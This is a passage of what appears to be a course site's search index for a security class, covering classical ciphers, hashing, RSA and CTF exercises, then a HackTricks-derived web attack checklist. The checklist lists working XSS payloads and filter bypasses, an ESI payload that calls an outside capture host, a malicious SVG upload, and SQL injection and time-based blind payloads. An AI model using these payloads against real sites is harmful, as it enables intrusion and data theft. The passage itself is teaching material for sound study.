Encryption is trivial to bruteforce as there are only 255 key combinations to try.</p>"},{"location":"CS315/2021/Week%2011/#multibyte-xor-encryption","title":"Multibyte XOR Encryption","text":"<p>Multibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the english alphabet than others.</p>"},{"location":"CS315/2021/Week%2011/#substitution-cipher","title":"Substitution Cipher","text":"<p>A Substitution Cipher is system of encryption where different symobls substitute a normal alphabet.</p> <p></p>"},{"location":"CS315/2021/Week%2011/#caesar-cipherrot-13","title":"Caesar Cipher/ROT 13","text":"<p>The Caesar Cipher or Caesar Shift is a cipher which uses the alphabet in order to encode texts.</p> <pre><code>CAESAR` encoded with a shift of 8 is `KIMAIZ` so `ABCDEFGHIJKLMNOPQRSTUVWXYZ` becomes `IJKLMNOPQRSTUVWXYZABCDEFGH\n</code></pre> <p>ROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts.</p> <p></p>"},{"location":"CS315/2021/Week%2011/#vigenere-cipher","title":"Vigenere Cipher","text":"<p>A Vigenere Cipher is an extended Caesar Cipher where a message is encrypted using various Caesar shifted alphabets.</p> <p>The following table can be used to encode a message: </p>"},{"location":"CS315/2021/Week%2011/#encryption","title":"Encryption","text":"<p>For example, encrypting the text <code>SUPERSECRET</code> with <code>CODE</code> would follow this process:</p> <ol> <li><code>CODE</code> gets padded to the length of <code>SUPERSECRET</code> so the key becomes <code>CODECODECOD</code></li> <li>For each letter in <code>SUPERSECRET</code> we use the table to get the Alphabet to use, in this instance row <code>C</code> and column <code>S</code></li> <li>The ciphertext's first letter then becomes <code>U</code></li> <li>We eventually get <code>UISITGHGTSW</code></li> </ol>"},{"location":"CS315/2021/Week%2011/#decryption","title":"Decryption","text":"<ol> <li>Go to the row of the key, in this case <code>C</code></li> <li>Find the letter of the cipher text in this row, in this case <code>U</code></li> <li>The column is the first letter of the decrypted ciphertext, so we get <code>S</code></li> <li>After repeating this process we get back to <code>SUPERSECRET</code></li> </ol>"},{"location":"CS315/2021/Week%2011/#hashing-functions","title":"Hashing Functions","text":"<p>Hashing functions are one way functions which theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have collisions or two different pieces of data which produce the same supposed unique output.</p>"},{"location":"CS315/2021/Week%2011/#string-hashing","title":"String Hashing","text":"<p>A string hash is a number or string generated using an algorithm that runs on text or data.</p> <p>The idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes.</p> <p>You can use command line tools tools or online resources such as this one. Example: <code>$ echo -n password | md5 5f4dcc3b5aa765d61d8327deb882cf99</code> Here, \u201cpassword\u201d is hashed with different hashing algorithms:</p> <ul> <li>SHA-1: 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8</li> <li>SHA-2: 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8</li> <li>MD5: 5F4DCC3B5AA765D61D8327DEB882CF99</li> <li>CRC32: BBEDA74F</li> </ul> <p>Generally, when verifying a hash visually, you can simply look at the first and last four characters of the string.</p>"},{"location":"CS315/2021/Week%2011/#file-hashing","title":"File Hashing","text":"<p>A file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change.</p> <p>What is it used for? - File and data identification - Password/certificate storage comparison</p> <p>How can we determine the hash of a file? You can use the md5sum command (or similar).</p> <pre><code>$ md5sum samplefile.txt\n3b85ec9ab2984b91070128be6aae25eb samplefile.txt\n</code></pre>"},{"location":"CS315/2021/Week%2011/#hash-collisions","title":"Hash Collisions","text":"<p>A collision is when two pieces of data or text have the same cryptographic hash. This is very rare.</p> <p>What\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes on a computer, since it\u2019s hard to get the passwords from hashes.</p> <p></p> <p>If you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password.</p> <p>Two different files on the same hard drive with the same cryptographic hash can be very interesting.</p> <p>\u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d said Peter Selinger of Dalhousie University. \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d</p> <p>For example, he cited this famous pair:</p> <p></p> <p>and</p> <p></p> <p>Each of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4.</p> <p>Selinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d</p> <p>Ben Laurie has a nice website that visualizes this MD5 collision. For a non-technical, though slightly outdated, introduction to hash functions, see Steve Friedl\u2019s Illustrated Guide. And here\u2019s a good article from DFI News that explores the same topic.</p>"},{"location":"CS315/2021/Week%2011/#rsa","title":"RSA","text":"<p>RSA, which is an abbreviation of the author's names (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem which allows for asymmetric encryption. Asymmetric cryptosystems are alos commonly referred to as Public Key Cryptography where a public key is used to encrypt data and only a secret, private key can be used to decrypt the data.</p>"},{"location":"CS315/2021/Week%2011/#definitions","title":"Definitions","text":"<ul> <li>The Public Key is made up of (n, e)</li> <li>The Private Key is made up of (n, d)</li> <li>The message is represented as m and is converted into a number</li> <li>The encrypted message or ciphertext is represented by c</li> <li>p and q are prime numbers which make up n</li> <li>e is the public exponent</li> <li>n is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA)</li> <li>d is the private exponent</li> <li>The totient \u03bb(n) is used to compute d and is equal to the lcm(p-1, q-1), another definition for \u03bb(n) is that \u03bb(pq) = lcm(\u03bb(p), \u03bb(q))</li> </ul>"},{"location":"CS315/2021/Week%2011/#what-makes-rsa-viable","title":"What makes RSA viable?","text":"<p>If public n, public e, private d are all very large numbers and a message m holds true for 0 &lt; m &lt; n, then we can say:</p> <p>(me)d \u2261 m (mod n)</p> <p>The triple equals sign in this case refers to modular congruence which in this case means that there exists an integer k such that (me)d = kn + m</p> <p>RSA is viable because it is incredibly hard to find d even with m, n, and e because factoring large numbers is an arduous process.</p>"},{"location":"CS315/2021/Week%2011/#implementation","title":"Implementation","text":"<p>RSA follows 4 steps to be implemented: 1. Key Generation 2. Encryption 3. Decryption</p>"},{"location":"CS315/2021/Week%2011/#key-generation","title":"Key Generation","text":"<p>We are going to follow along Wikipedia's small numbers example in order to make this idea a bit easier to understand.</p> <p>In This example we are using Carmichael's totient function where \u03bb(n) = lcm(\u03bb(p), \u03bb(q)), but Euler's totient function is perfectly valid to use with RSA. Euler's totient is \u03c6(n) = (p \u2212 1)(q \u2212 1)</p> <ol> <li>Choose two prime numbers such as:</li> <li>p = 61 and q = 53</li> <li>Find</li> <li>n = pq = 3233</li> <li>Calculate \u03bb(n) = lcm(p-1, q-1)</li> <li>\u03bb(3233) = lcm(60, 52) = 780</li> <li>Choose a public exponent such that 1 &lt; e &lt; \u03bb(n) and is coprime (not a factor of) \u03bb(n). The standard is most cases is 65537, but we will be using:</li> <li>e = 17</li> <li>Calculate d as the modular multiplicative inverse or in english find d such that: d x e mod \u03bb(n) = 1</li> <li>d x 17 mod 780 = 1</li> <li>d = 413</li> </ol> <p>Now we have a public key of (3233, 17) and a private key of (3233, 413)</p>"},{"location":"CS315/2021/Week%2011/#encryption_1","title":"Encryption","text":"<p>With the public key, m can be encrypted trivially</p> <p>The ciphertext is equal to me mod n or:</p> <p>c = m^17 mod 3233</p>"},{"location":"CS315/2021/Week%2011/#decryption_1","title":"Decryption","text":"<p>With the private key, m can be decrypted trivially as well</p> <p>The plaintext is equal to cd mod n or:</p> <p>m = c^413 mod 3233</p>"},{"location":"CS315/2021/Week%2011/#exploitation","title":"Exploitation","text":"<p>From the RsaCtfTool README</p> <p>Attacks:</p> <ul> <li>Weak public key factorization</li> <li>Wiener's attack</li> <li>Hastad's attack (Small public exponent attack)</li> <li>Small q (q &lt; 100,000)</li> <li>Common factor between ciphertext and modulus attack</li> <li>Fermat's factorisation for close p and q</li> <li>Gimmicky Primes method</li> <li>Past CTF Primes method</li> <li>Self-Initializing Quadratic Sieve (SIQS) using Yafu</li> <li>Common factor attacks across multiple keys</li> <li>Small fractions method when p/q is close to a small fraction</li> <li>Boneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d &lt; n0.292)</li> <li>Elliptic Curve Method</li> <li>Pollards p-1 for relatively smooth numbers</li> <li>Mersenne primes factorization</li> </ul>"},{"location":"CS315/2021/Week%2011/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%2011/#4-pt-pseudo-random-primes","title":"(4 pt) Pseudo Random Primes","text":"<p>A wiser once said: \"every number can be factored to the sum of primes.\"</p> <p>Try to factor the number and find me some flag.</p> <p>Checkpoint: what's the first 20 numbers in f(pow(10,6))? Find those numbers and gain 2 points.</p> <p>Hint: try to convert enc into the binary.</p> <p>main.py</p>"},{"location":"CS315/2021/Week%2011/#4-pt-gcd-oracle","title":"(4 pt) GCD Oracle","text":"<p>Some oracle can get you LSB and help solve the challenge. Now break the number N with the GCD Oracle.</p> <p>Byte</p> <p>The number N has 8 bits at most. Oracle can give you 10 times of response and then you should give the value of N.</p> <p>Solving this gives you the checkpoint for 2 points. But you can directly solve the second question and get 4 points.</p> <p><code>nc ali.infury.org 10008</code></p> <p>Full</p> <p>The number N has 512 bits at most. If you solve this, don't need to solve the previous question.</p> <p>Hint: you may need a script to solve the second question.</p> <p><code>nc ali.infury.org 10007</code></p> <p>main.py</p>"},{"location":"CS315/2021/Week%2011/#2-pt-rsa-in-the-triangle","title":"(2 pt) RSA in the triangle","text":"<p>A modern public key encryption requires a key pair of 512 bytes usually. Sometimes I just confused about the private key. Therefore, I designed a \"super secure\" method to find me a private key.</p> <p>Hint: find a faster way to calculate the triangle.</p> <p>main.py</p> <p>challenge.txt</p>"},{"location":"CS315/2021/Week%2012/","title":"Week12 WEB: Attacking Websites","text":"<p>According to @Hacktricks: https://book.hacktricks.xyz/</p> <p>In every pentest web there is several hidden and obvious places that might be vulnerable. This post is meant to be a checklist to confirm that you have searched vulnerabilities in all the possible places.</p>"},{"location":"CS315/2021/Week%2012/#top-10-vulnerabilities","title":"Top 10 vulnerabilities","text":"<p>https://owasp.org/www-project-top-ten/</p> <ul> <li>Injection</li> <li>Broken Authentication and Session Management</li> <li>Sensitive Data Exposure</li> <li>XML External Entity</li> <li>Broken Access Control</li> <li>Security Misconfiguration</li> <li>Cross-Site Scripting</li> <li>Insecure deserialization</li> <li>Using Components With Known Vulnerabilities</li> <li>Insufficient Logging and Monitoring</li> </ul>"},{"location":"CS315/2021/Week%2012/#proxies","title":"Proxies","text":"<p>Nowadays web applications usually uses some kind of intermediary proxies, those may be (ab)used to exploit vulnerabilities. These vulnerabilities need a vulnerable proxy to be in place, but they usually also need some extra vulnerability in the backend.</p> <ul> <li>Abusing hop-by-hop headers</li> <li>Cache Poisoning/Cache Deception</li> <li>HTTP Request Smuggling</li> <li>H2C Smuggling</li> <li>Server Side Inclusion/Edge Side Inclusion</li> <li>Uncovering Cloudflare</li> <li>XSLT Server Side Injection</li> </ul>"},{"location":"CS315/2021/Week%2012/#user-input","title":"User input","text":"<p>Most of the web applications will allow users to input some data that will be processed later. Depending on the structure of the data the server is expecting some vulnerabilities may or may not apply.</p>"},{"location":"CS315/2021/Week%2012/#reflected-values","title":"Reflected Values","text":"<p>If the introduced data may somehow being reflected in the response, the page might be vulnerable to several issues.</p> <ul> <li>Client Side Template Injection</li> <li>Command Injection</li> <li>CRLF</li> <li>Dangling Markup</li> <li>File Inclusion/Path Traversal</li> <li>Open Redirect</li> <li>Prototype Pollution to XSS</li> <li>Server Side Inclusion/Edge Side Inclusion</li> <li>Server Side Request Forgery</li> <li>Server Side Template Injection</li> <li>Reverse Tab Nabbing</li> <li>XSLT Server Side Injection</li> <li>XSS</li> <li>XSSI</li> <li>XS-Search</li> </ul> <p>Some of the mentioned vulnerabilities requires special conditions, others just require the content to be reflected. You can find some interesting polygloths to test quickly the vulnerabilities in:</p> <p>Reflecting Techniques - PoCs and Polygloths CheatSheet</p>"},{"location":"CS315/2021/Week%2012/#xss-cross-site-scripting","title":"XSS (Cross Site Scripting)","text":""},{"location":"CS315/2021/Week%2012/#methodology","title":"Methodology","text":"<ol> <li>Check if any value you control (parameters, path, headers?, cookies?) is being reflected in the HTML or used by JS code.</li> <li>Find the context where it's reflected/used.</li> <li>If reflected</li> <li>Check which symbols can you use and depending on that, prepare the payload:<ol> <li>In raw HTML :<ol> <li>Can you create new HTML tags?</li> <li>Can you use events or attributes supporting <code>javascript:</code> protocol?</li> <li>Can you bypass protections?</li> <li>Is the HTML content being interpreted by any client side JS engine (AngularJS, VueJS, Mavo...), you could abuse a Client Side Template Injection.</li> <li>If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - HTML scriptless injection?</li> </ol> </li> <li>Inside a HTML tag :<ol> <li>Can you exit to raw HTML context?</li> <li>Can you create new events/attributes to execute JS code?</li> <li>Does the attribute where you are trapped support JS execution?</li> <li>Can you bypass protections?</li> </ol> </li> <li>Inside JavaScript code :<ol> <li>Can you escape the <code>&lt;script&gt;</code> tag?</li> <li>Can you escape the string and execute different JS code?</li> <li>Are your input in template literals ``?</li> <li>Can you bypass protections?</li> </ol> </li> </ol> </li> <li>If used :</li> <li>You could exploit a DOM XSS, pay attention how your input is controlled and if your controlled input is used by any sink.</li> </ol>"},{"location":"CS315/2021/Week%2012/#reflected-values_1","title":"Reflected values","text":"<p>In order to successfully exploit a XSS the first thing you need to find is a value controlled by you that is being reflected in the web page.</p> <ul> <li>Intermediately reflected: If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a Reflected XSS.</li> <li>Stored and reflected: If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a Stored XSS.</li> <li>Accessed via JS: If you find that a value controlled by you is being access using JS you could exploit a DOM XSS.</li> </ul>"},{"location":"CS315/2021/Week%2012/#contexts","title":"Contexts","text":"<p>When trying to exploit a XSS the first thing you need to know if where is your input being reflected. Depending on the context, you will be able to execute arbitrary JS code on different ways.</p>"},{"location":"CS315/2021/Week%2012/#raw-html","title":"Raw HTML","text":"<p>If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: <code>&lt;img , &lt;iframe , &lt;svg , &lt;script</code> ... these are just some of the many possible HTML tags you could use. Also, keep in mind Client Side Template Injection.</p>"},{"location":"CS315/2021/Week%2012/#inside-html-tags-attribute","title":"Inside HTML tags attribute","text":"<p>If your input is reflected inside the value of the attribute of a tag you could try:</p> <ol> <li>To escape from the attribute and from the tag (then you will be in the raw HTML) and create new HTML tag to abuse: <code>\"&gt;&lt;img [...]</code></li> <li>If you can escape from the attribute but not from the tag (<code>&gt;</code> is encoded or deleted), depending on the tag you could create an event that executes JS code: <code>\" autofocus onfocus=alert(1) x=\"</code></li> <li>If you cannot escape from the attribute (<code>\"</code> is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like <code>onclick=</code> you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute <code>href</code>, where you can use the <code>javascript:</code> protocol to execute arbitrary code: <code>href=\"javascript:alert(1)\"</code></li> <li>If your input is reflected inside \"unexpoitable tags\" you could try the <code>accesskey</code> trick to abuse the vuln (you will need some kind of social engineer to exploit this): <code>\" accesskey=\"x\" onclick=\"alert(1)\" x=\"</code></li> </ol>"},{"location":"CS315/2021/Week%2012/#inside-javascript-code","title":"Inside JavaScript code","text":"<p>In this case your input is reflected between <code>&lt;script&gt; [...] &lt;/script&gt;</code> tags of a HTML page, inside a <code>.js</code>file or inside an attribute using <code>javascript:</code> protocol:</p> <ul> <li>If reflected between <code>&lt;script&gt; [...] &lt;/script&gt;</code> tags, even if your input if inside any kind of quotes, you can try to inject <code>&lt;/script&gt;</code> and escape from this context. This works because the browser will first parse the HTML tags and then the content, therefore, it won't notice that your injected <code>&lt;/script&gt;</code> tag is inside the HTML code.</li> <li>If reflected inside a JS string and the last trick isn't working you would need to exit the string, execute your code and reconstruct the JS code (if there is any error, it won't be executed:</li> <li><code>'-alert(1)-'</code></li> <li><code>';-alert(1)//</code></li> <li><code>\\';alert(1)//</code></li> <li>If reflected inside template literals <code>you can **embed JS expressions** using `${ ... }` syntax:</code>var greetings =`Hello, ${alert(1)}```</li> </ul>"},{"location":"CS315/2021/Week%2012/#dom","title":"DOM","text":"<p>There is JS code that is using unsafely some data controlled by an attacker like <code>location.href</code> . An attacker, could abuse this to execute arbitrary JS code.</p> <p>https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/dom-xss.md</p>"},{"location":"CS315/2021/Week%2012/#universal-xss","title":"Universal XSS","text":"<p>These kind of XSS can be found anywhere. They not depend just on the client exploitation of a web application but on any context. These kind of arbitrary JavaScript execution can even be abuse to obtain RCE, read arbitrary files in clients and servers, and more.</p> <p>Some examples:</p> <p>https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md</p> <p>https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-web/xss-to-rce-electron-desktop-apps.md</p>"},{"location":"CS315/2021/Week%2012/#injecting-inside-raw-html","title":"Injecting inside raw HTML","text":"<p>When your input is reflected inside the HTML page or you can escape and inject HTML code in this context the first thing you need to do if check if you can abuse <code>&lt;</code> to create new tags: Just try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected without changes. Only in the last case you will be able to exploit this case. For this cases also keep in mind Client Side Template Injection. Note: A HTML comment can be closed using <code>--&gt;</code> or <code>--!&gt;</code></p> <p>In this case and if no black/whitelisting is used, you could use payloads like:</p> <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;img src=x onerror=alert(1) /&gt;\n&lt;svg onload=alert('XSS')&gt;\n</code></pre> <p>But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags you can create. Once you have located which tags are allowed, you would need to brute-force attributes/events inside the found valid tags to see how you can attack the context.</p>"},{"location":"CS315/2021/Week%2012/#tagsevents-brute-force","title":"Tags/Events brute-force","text":"<p>Go to https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and click on Copy tags to clipboard. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags (in the same web page click on Copy events to clipboard and follow the same procedure as before).</p>"},{"location":"CS315/2021/Week%2012/#custom-tags","title":"Custom tags","text":"<p>If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the <code>onfocus</code> attribute. In the XSS request, you need to end the URL with <code>#</code> to make the page focus on that object and execute the code:</p> <pre><code>/?search=&lt;xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1&gt;#x\n</code></pre>"},{"location":"CS315/2021/Week%2012/#blacklist-bypasses","title":"Blacklist Bypasses","text":"<p>If some kind of blacklist is being used you could try to bypass it with some silly tricks:</p> <pre><code>//Random capitalization\n&lt;script&gt; --&gt; &lt;ScrIpT&gt;\n&lt;img --&gt; &lt;ImG\n\n//Double tag, in case just the first match is removed\n&lt;script&gt;&lt;script&gt;\n&lt;scr&lt;script&gt;ipt&gt;\n&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;\n\n//You can substitude the space to separate attributes for:\n/\n/*%00/\n/%00*/\n%2F\n%0D\n%0C\n%0A\n%09\n\n//Unexpected parent tags\n&lt;svg&gt;&lt;x&gt;&lt;script&gt;alert('1'&amp;#41&lt;/x&gt;\n\n//Unexpected weird attributes\n&lt;script x&gt;\n&lt;script a=\"1234\"&gt;\n&lt;script ~~~&gt;\n&lt;script/random&gt;alert(1)&lt;/script&gt;\n&lt;script      ///Note the newline\n&gt;alert(1)&lt;/script&gt;\n&lt;scr\\x00ipt&gt;alert(1)&lt;/scr\\x00ipt&gt;\n\n//Not closing tag, ending with \" &lt;\" or \" //\"\n&lt;iframe SRC=\"javascript:alert('XSS');\" &lt;\n&lt;iframe SRC=\"javascript:alert('XSS');\" //\n\n//Extra open\n&lt;&lt;script&gt;alert(\"XSS\");//&lt;&lt;/script&gt;\n\n//Just weird an unexpected, use your imagination\n&lt;&lt;/script/script&gt;&lt;script&gt;\n&lt;input type=image src onerror=\"prompt(1)\"&gt;\n\n//Using `` instead of parenthesis\nonerror=alert`1`\n\n//Use more than one\n&lt;&lt;TexTArEa/*%00//%00*/a=\"not\"/*%00///AutOFocUs////onFoCUS=alert`1` //\n</code></pre>"},{"location":"CS315/2021/Week%2012/#length-bypass-xss-in-20chars","title":"Length bypass (XSS in 20chars)","text":"<p>Taken from the blog of Jorge Lajara.</p> <pre><code>&lt;svg/onload=alert``&gt;\n&lt;script src=//aa.es&gt;\n&lt;script src=//\u2121\u33db.pw&gt;\n</code></pre> <p>The last one is using 2 unicode characters which expands to 5: telsr More of these characters can be found here. To check in which characters are decomposed check here. More tiny XSS for different environments payload [can be found here and here.</p>"},{"location":"CS315/2021/Week%2012/#click-xss-clickjacking","title":"Click XSS - Clickjacking","text":"<p>If in order to exploit the vulnerability you need the user to click a link or a form with prepopulated data you could try to abuse Clickjacking (if the page is vulnerable).</p>"},{"location":"CS315/2021/Week%2012/#impossible-dangling-markup","title":"Impossible - Dangling Markup","text":"<p>If you just think that it's impossible to create an HTML tag with an attribute to execute JS code, you should check Danglig Markup because you could exploit the vulnerability without executing JS code.</p>"},{"location":"CS315/2021/Week%2012/#xss-abusing-other-vulnerabilities","title":"XSS Abusing other vulnerabilities","text":""},{"location":"CS315/2021/Week%2012/#xss-to-ssrf","title":"XSS to SSRF","text":"<p>Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include Injection with this payload:</p> <pre><code>&lt;esi:include src=\"http://yoursite.com/capture\" /&gt;\n</code></pre> <p>Use it to bypass cookie restrictions, XSS filters and much more! More information about this technique here: XSLT.</p>"},{"location":"CS315/2021/Week%2012/#xss-in-dynamic-created-pdf","title":"XSS in dynamic created PDF","text":"<p>If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code. So, if the PDF creator bot finds some kind of HTML tags, it is going to interpret them, and you can abuse this behaviour to cause a Server XSS.</p> <p>https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md</p> <p>If you cannot inject HTML tags it could be worth it to try to inject PDF data:</p> <p>https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/pdf-injection.md</p>"},{"location":"CS315/2021/Week%2012/#xss-uploading-files-svg","title":"XSS uploading files (svg)","text":"<p>Upload as an image a file like the following one (from http://ghostlulz.com/xss-svg/):</p> <pre><code>Content-Type: multipart/form-data; boundary=---------------------------232181429808\nContent-Length: 574\n-----------------------------232181429808\nContent-Disposition: form-data; name=\"img\"; filename=\"img.svg\"\nContent-Type: image/svg+xml\n\n&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n   &lt;rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /&gt;\n   &lt;script type=\"text/javascript\"&gt;\n      alert(1);\n   &lt;/script&gt;\n&lt;/svg&gt;\n-----------------------------232181429808--\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n   &lt;script type=\"text/javascript\"&gt;alert(\"XSS\")&lt;/script&gt;\n&lt;/svg&gt;\n&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n&lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/&gt;\n&lt;script type=\"text/javascript\"&gt;\nalert(\"XSS\");\n&lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"CS315/2021/Week%2012/#xss-resources","title":"XSS resources","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection http://www.xss-payloads.com https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt https://github.com/materaj/xss-list https://github.com/ismailtasdelen/xss-payload-list https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec https://netsec.expert/2020/02/01/xss-in-2020.html</p>"},{"location":"CS315/2021/Week%2012/#xss-tools","title":"XSS TOOLS","text":"<p>Find some tools for XSS here.</p>"},{"location":"CS315/2021/Week%2012/#search-functionalities","title":"Search functionalities","text":"<p>If the functionality may be used to search some kind of data inside the backend, maybe you can (ab)use it to search arbitrary data.</p> <ul> <li>File Inclusion/Path Traversal</li> <li>NoSQL Injection</li> <li>LDAP Injection</li> <li>ReDoS</li> <li>SQL Injection</li> <li>XAPTH Injection</li> </ul>"},{"location":"CS315/2021/Week%2012/#sql-injection","title":"SQL Injection","text":""},{"location":"CS315/2021/Week%2012/#what-is-sql-injection","title":"What is SQL injection?","text":"<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. (From here).</p> <p>In this POST I'm going to suppose that we have found a possible SQL injection and we are going to discuss possible methods to confirm the SQL injection, recon the database and perform actions.</p>"},{"location":"CS315/2021/Week%2012/#entry-point-detection","title":"Entry point detection","text":"<p>You may have found a site that is apparently vulnerable to SQLi just because the server is behaving weird with SQLi related inputs. Therefore, the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context. These are some useful examples:</p> <pre><code> [Nothing]\n'\n\"\n`\n')\n\")\n`)\n'))\n\"))\n`))\n</code></pre> <p>Then, you need to know how to fix the query so there isn't errors. In order to fix the query you can input data so the previous query accept the new data, or you can just input your data and add a comment symbol add the end.</p> <p>Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy.</p>"},{"location":"CS315/2021/Week%2012/#comments","title":"Comments","text":"<pre><code>MySQL\n#comment\n-- comment     [Note the space after the double dash]\n/*comment*/\n/*! MYSQL Special SQL */\n\nPostgreSQL\n--comment\n/*comment*/\n\nMSQL\n--comment\n/*comment*/\n\nOracle\n--comment\n\nSQLite\n--comment\n/*comment*/\n\nHQL\nHQL does not support comments\n</code></pre>"},{"location":"CS315/2021/Week%2012/#confirming-with-logical-operations","title":"Confirming with logical operations","text":"<p>One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results. For example: if the GET parameter <code>?username=Peter</code> returns the same content as <code>?username=Peter' or '1'='1</code> then, you found a SQL injection.</p> <p>Also you can apply this concept to mathematical operations. Example: If <code>?id=1</code> returns the same as <code>?id=2-1</code>, SQLinjection.</p> <pre><code>page.asp?id=1 or 1=1 -- true\npage.asp?id=1' or 1=1 -- true\npage.asp?id=1\" or 1=1 -- true\npage.asp?id=1 and 1=2 -- false\n</code></pre>"},{"location":"CS315/2021/Week%2012/#confirming-with-timing","title":"Confirming with Timing","text":"<p>In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load. Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:</p> <pre><code>MySQL (string concat and logical ops)\n1' + sleep(10)\n1' and sleep(10)\n1' &amp;&amp; sleep(10)\n1' | sleep(10)\n\nPostgreSQL (only support string concat)\n1' || pg_sleep(10)\n\nMSQL\n1' WAITFOR DELAY '0:0:10'\n\nOracle\n1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])\n1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)\n\nSQLite\n1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\n</code></pre> <p>In some cases the sleep functions won't be allowed. Then, instead of using those functions you could make the query perform complex operations that will take several seconds. Examples of these techniques are going to be commented separately on each technology (if any).</p>"},{"location":"CS315/2021/Week%2012/#identifying-back-end","title":"Identifying Back-end","text":"<p>The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones:</p> <pre><code>[\"conv('a',16,2)=conv('a',16,2)\"                   ,\"MYSQL\"],\n[\"connection_id()=connection_id()\"                 ,\"MYSQL\"],\n[\"crc32('MySQL')=crc32('MySQL')\"                   ,\"MYSQL\"],\n[\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\"       ,\"MSSQL\"],\n[\"@@CONNECTIONS&gt;0\"                                 ,\"MSSQL\"],\n[\"@@CONNECTIONS=@@CONNECTIONS\"                     ,\"MSSQL\"],\n[\"@@CPU_BUSY=@@CPU_BUSY\"                           ,\"MSSQL\"],\n[\"USER_ID(1)=USER_ID(1)\"                           